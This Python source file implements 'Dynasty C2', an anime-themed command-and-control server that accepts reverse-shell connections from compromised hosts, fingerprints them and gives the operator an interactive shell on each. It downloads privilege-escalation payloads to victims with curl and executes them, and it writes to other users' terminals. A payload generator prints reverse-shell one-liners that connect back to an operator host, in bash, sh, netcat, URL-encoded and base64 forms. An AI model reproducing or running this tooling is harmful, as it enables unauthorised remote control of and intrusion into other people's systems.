import socket
import os
import threading
import time 
import sys
import select
import uuid 
import random 
import signal
import readline 
import requests
import getpass 
from rich.table import Table 
import platform 
from rich.console import Console 
from rich.progress import Progress 
from rich.panel import Panel
from rich.live import Live 
from rich.layout import Layout
from rich.prompt import Prompt
from rich.progress import track
from rich.align import Align
from rich.bar import Bar 
import typer
from banners import characters
from banners import banners
from colors import NiceColors
from privesc import privesc  
from privesc import privesc_tab 
import base64 
import re 
from contextlib import contextmanager 


HOST = sys.argv[1]
PORT = sys.argv[2]
WEB_PORT = sys.argv[3]
app = typer.Typer()
conn_list = {}
console = Console() 



def get_os_info(conn):
    try:
        conn.settimeout(1)
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
        except socket.timeout:
            pass

        conn.sendall(b"uname -a\n")
        conn.settimeout(5)
        os_info = b""
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                os_info += data
            except socket.timeout:
                break
        if "Linux" in os_info.decode('utf-8').strip():
            return "Linux" 
        else: 
            return "Windows"
    except Exception as e:
        print(f"Failed to get OS info: {e}")
        return "Unknown"

def get_hostname(conn):
    try:

        conn.settimeout(1)
        try:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
        except socket.timeout:
            pass 

        conn.sendall(b"hostname\n")
        conn.settimeout(5)
        host_info = b""
        while True:
            try:
                data = conn.recv(1024)
                if not data:
                    break
                host_info += data
            except socket.timeout:
                break

        hostname = host_info.decode('utf-8').strip().split()[1]
        return hostname
    except Exception as e:
        print(f"Failed to get hostname: {e}")
        return "Unknown"

def server(HOST, PORT):
    global conn_list

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(5)

    def handle_client(conn, addr):
        client_id = str(uuid.uuid4())
        os_info = get_os_info(conn)
        host_info = get_hostname(conn) 
        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info, "Hostname": host_info}

    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start() 

def list_agents():
    global conn_list

    agents = 0 
    table = Table(title="Agent List")
    table.add_column("Agents", style="cyan")
    table.add_column("ID", style="magenta")
    table.add_column("IP", style="green")
    table.add_column("OS", style="blue") 
    table.add_column("Hostname", style="blue") 
    table.add_column("Character", style="yellow") 

    if conn_list:
        for client_id, client_info in conn_list.items():
            agents += 1
            agent_char = random.choice(characters.agent_chars)
            table.add_row(str(agents), client_id, client_info["IP"], client_info["OS"], client_info["Hostname"], agent_char)
        
        console.log(table)
    else:
        console.log("[[red]ERROR[/]]No agents connected .") 

def kill_agent(agent_key):
    global conn_list

    if agent_key in conn_list:
        agent_info = conn_list.pop(agent_key, None)
        if agent_info:
            agent_conn = agent_info.get("Connection")
            if agent_conn:
                agent_conn.close()
                console.log(f"{NiceColors.green}[INFO] Agent {agent_key} has been terminated :){NiceColors.reset}")
            else:
                console.log(f"{NiceColors.red}[ERROR] Connection for agent {agent_key} not found :({NiceColors.reset}")
        else:
            console.log(f"{NiceColors.red}[ERROR] Information for agent {agent_key} not found :({NiceColors.reset}")
    else:
        console.log(f"{NiceColors.red}[ERROR] Agent {agent_key} not found :({NiceColors.reset}")

def start_interaction(agent_num):
    global conn_list
    if conn_list:
        keys = list(conn_list.keys())
        if agent_num <= len(keys):
            cmd_interact(conn_list[keys[agent_num - 1]]["Connection"], keys[agent_num - 1], keys[agent_num - 1])
        else:
            console.log(f"{NiceColors.red}[ERROR] Invalid agent number {NiceColors.reset}")
    else:
        console.log(f"{NiceColors.red}[ERROR]No connections{NiceColors.reset}")

def recv_all(conn, buffer_size=4096): 
    data = b""
    while True:
        chunk = conn.recv(buffer_size)
        if not chunk:
            break
        data += chunk
    return data

def check_python_paths(conn):
    python_paths = ['/usr/bin/python3', '/usr/bin/python', '/usr/local/bin/python3', '/usr/local/bin/python']
    found_paths = []

    for path in python_paths:
        command = f"{path} --version 2>/dev/null"
        conn.sendall(command.encode('utf-8') + b'\n')
        output = conn.recv(8912).decode('utf-8')
        
        if "Python" in output:
            version_str = output.split()[1]
            version = int(version_str.split('.')[0])
            found_paths.append((path, version))

    return found_paths

def print_agent_info(conn_list, agent_key):
    if conn_list:
        if agent_key in conn_list:
            client_info = conn_list[agent_key]
            console.log(f"[dodger_blue1]Agent Key: [cyan]{agent_key}[/]")
            console.log(f"[dodger_blue1]IP: [cyan]{client_info['IP']}[/]")
            console.log(f"[dodger_blue1]OS: [cyan]{client_info['OS']}[/]")
        else:
            console.log("[[red]ERROR[/]] Agent key not available")

def cmd_interact(conn, victim, socket_target):
    global conn_list
    global PYTHON_VERSION

    print_agent_info(conn_list, victim)

    python_versions = check_python_paths(conn)
    if python_versions:
        console.log("[info]Python is available on the following paths:[/]")
        for path, version in python_versions:
            console.log(f"  {path}: {version}")
            PYTHON_VERSION = version
    else:
        console.log("[info]Python is not available on the active agent.[/]")

    try:
        while True:
            ready, _, _ = select.select([conn, sys.stdin], [], [], 1)

            if conn in ready:
                data = conn.recv(8912).decode('utf-8')
                if not data:
                    command = console.input()
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(data)
                else:
                    print(data, end='')

            if sys.stdin in ready:
                command = console.input()
                if command.lower() == "quit" or command.lower() == "exit":
                    break
                
                if "show privesc-payloads" in command.lower():
                    console.log(privesc_tab)
                
                tmp_var = command.lower().split(' ')
                if "check" in command.lower():
                    if tmp_var[0] == "check":
                        if tmp_var[1] == "privesc":
                            selected_payload = int(tmp_var[2])
                            if 0 < selected_payload <= len(privesc):
                                payload = privesc[selected_payload-1][1]
                                if 1 <= int(selected_payload) <= 5:
                                    cmd = f"curl {sys.argv[1]}:{sys.argv[3]}/payloads/{payload} -O {payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output)
                                    cmd = f"chmod +x {payload}; ./{payload}"
                                    conn.sendall(cmd.encode('utf-8') + b'\n')
                                    output = conn.recv(8912).decode('utf-8')
                                    print(output) 

                if command.lower().startswith("upload"):
                    file_path = command.split(" ")[1]
                    file_name = command.split(" ")[2]
                    if os.path.exists(file_path):
                        with open(file_path, "rb") as f:
                            file_data = f.read()
                        cmd = f"""
                        echo '{file_data}' > {file_name}
                        """
                        conn.sendall(cmd.encode('utf-8') + b'\n')
                        output = conn.recv(8912).decode('utf-8')
                        print(output)
                    else:
                        print("File not found.")

                if command.lower() == "troll":
                    troll_command = input(f"[TROLL] > ")
                    troll = f"MY=$(tty|cut -d'/' -f4);for L in $(seq 5);do [ $MY == $L] && {{ echo 'Live'; }} || {{ {troll_command} > /dev/pts/$L 2>/dev/null & }};done 2>/dev/null"
                    conn.sendall(troll.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)

                else:
                    conn.sendall(command.encode('utf-8') + b'\n')
                    output = conn.recv(8912).decode('utf-8')
                    print(output)

    except Exception as e:
        console.log(f"Error: {e}")
        del conn_list[socket_target]


def server_status(host, web_port):
    console.log(f"[{NiceColors.green}INFO{NiceColors.reset}] Checking Web server status")

    web_app = f"http://{host}:{web_port}"
    response = requests.get(web_app) 

    if response.ok:
        console.log(f"[{NiceColors.green}+{NiceColors.reset}] Web server active. Response code:", response.status_code)
    else:
        console.log(f"[{NiceColors.red}+{NiceColors.reset}] Web server down. Response code:", response.status_code) 


def payloads_list(lhost, lport, shell): 
    payload1 = '' 
    payload2 = '' 
    payload3 = '' 
    payload4 = '' 
    url_encoded_payload = '' 
    base64_payload = ''

    if shell == "bash":
        payload1 = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payload2 = f"bash -c '/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
        payload3 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f" 
        payload4 = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; /bin/bash <&196 >&196 2>&196" 
        url_encoded_payload = f"%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261" 
        base64_payload = base64.b64encode(payload2.encode("utf-8")).decode("utf-8") 

    elif shell == "sh":
        payload1 = f"sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        payload2 = f"sh -c '/bin/sh -i >& /dev/tcp/{lhost}/{lport} 0>&1'" 
        payload3 = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f" 
        payload4 = f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; /bin/sh <&196 >&196 2>&196" 
        url_encoded_payload = f"sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{lhost}%2F{lport}%200%3E%261" 
        base64_payload = base64.b64encode(payload2.encode("utf-8")).decode("utf-8") 
    
    payloads = [payload1, payload2, payload3, payload4, url_encoded_payload, base64_payload] 
    return payloads

def agents_conn():
    global conn_list

    agents = 0 
    if conn_list:
        for client_id, client_info in conn_list.items():
            agents += 1
    return agents

def generate_payloads(inp_cmd):
    find_lhost = re.search(r'lhost=([^&\s]+)', inp_cmd[2]) 
    find_lport = re.search(r'lport=(\d+)', inp_cmd[3]) 
    find_shell = re.search(r'shell=([^&\s]+)', inp_cmd[4]) 
            
    if find_lhost: lhost = find_lhost.group(1)
    else: console.print(f"[[red]ERROR[/]] lhost is not provided!"); return

    if find_lport: lport = find_lport.group(1)
    else: console.print(f"[[red]ERROR[/]] lport is not provided!"); return

    if find_shell: shell = find_shell.group(1)
    else: console.print(f"[[red]ERROR[/]] shell type is not provided!"); return

    with Progress() as progress:
        task1 = progress.add_task("[green]Generating Payloads...[/]", total=1000)
        while not progress.finished:
            progress.update(task1, advance=0.9)
            time.sleep(0.01)

    payloads = payloads_list(lhost, lport, shell)  
    num = 1
    for payload in payloads:
        console.log(f"[[blue]Payload {num}[/]]: [yellow]{payload}[/]") 
        num += 1


def update_status_bar(live, agents):
    panel = Panel(f"Connected Agents: {agents}", style="bold green")
    live.update(panel)

def main(host, port):
    hostname = socket.gethostname()
    username = getpass.getuser()
    threading.Thread(target=server, args=(host, port, )).start()

    framework_version = "1.0"
    console.log(f"""
    {NiceColors.magenta}
    ____                                                       _       _
  /  __    _       _______        ___                       _| |_  _ | |
 |   \ \__| |_    |____   |_ _   /  /                      |_  __|| || |
 |   /  __    \   ___/  _/|_|_| |  |___  __   ___________   / // \| || |
    /  _\/ /\  | |___  _____|   |   _  \|  | |___________| /__  /_| || |
    | |/ _/_/  |   /  /____     |  | |  |  |                / _/ /|_|| |
    \___/  \__/    \_______|   /__/   \___/                /_/  / ___| |  |
                                                            \_/\_\\____|  |
                                                                    ____/
    {NiceColors.reset} 
    {NiceColors.blue}   __
     /
       Dynasty C2 | Version {framework_version} (beta) | [ [cyan]{username}:{hostname}[/] ]
                   __/
                        [blue]Made by [green]Trevohack[/]

   [yellow][ "Dyansty" inspired by ANIME                    ][/]
   [yellow][  Anime-inspired C2 framework for digital heros ][/]

  Try help! 

  [orange1]OPEN PORTS[/]
  {host}:{port}[light_goldenrod1]................[/][sandy_brown]TCP Listener For Agents[/]
  {host}:{sys.argv[3]}[light_goldenrod1]................[/][sandy_brown]Web Server[/] 

[magenta]
-------------------------------------------------------------------------- 
[/]
    {NiceColors.reset}
    """) 

    agents = 0
    while True:
        try: 
            agents_now = agents_conn()
            if agents_now != agents:
                console.log("[green]New Agent Connected!")
                agents = agents_now        

            inp = console.input(f"[{NiceColors.yellow}{username}{NiceColors.reset}@{NiceColors.cyan}dynasty{NiceColors.reset}]~# ")
            inp_cmd = inp.split(' ')

            if inp_cmd[0] == "agents":
                starty = threading.Thread(target=list_agents)
                starty.start()
                starty.join()

            elif "exit" in inp:
                console.log(f"{banners.alien}")
                os._exit(1)

            elif inp == "help" or inp == "h":
                console.log(f"{banners.help}")

            elif inp_cmd[0] == "kill": 
                if len(inp_cmd) == 2: 
                    agent_key = inp_cmd[1] 
                    kill_agent(agent_key)
            
            elif inp == "server status":
                server_status(sys.argv[1], sys.argv[3]) 
            
            elif "generate" in inp: 
                if inp_cmd[1] == "payloads":
                    if len(inp_cmd) == 5: 
                        generate_payloads(inp_cmd) 


            elif inp_cmd[0] == "show" and inp_cmd[1] == "privesc-payloads":
                console.log(privesc_tab)

            elif inp_cmd[0] == "use" and len(inp_cmd) == 2 and inp_cmd[1].isdigit():
                agent_num = int(inp_cmd[1])
                max_agents = list(range(1, 11))
                if agent_num in max_agents:
                    starty = threading.Thread(target=start_interaction, args=(agent_num,))
                    starty.start()
                    starty.join()
                else:
                    console.log(f"{NiceColors.red}[ERROR] Invalid Agent Number :({NiceColors.reset}")
        except OSError: 
            console.print("[red][ERROR] Could not load the framework properly, exiting... [/]")
            sys.exit(1)

        except Exception as e: 
            console.print(f"[red][ERROR] Code: {e}, exiting... [/]")
            sys.exit(1)

if len(sys.argv) != 4:
    console.log(banners.help)
    sys.exit(1)

else:
    main(HOST, int(PORT))
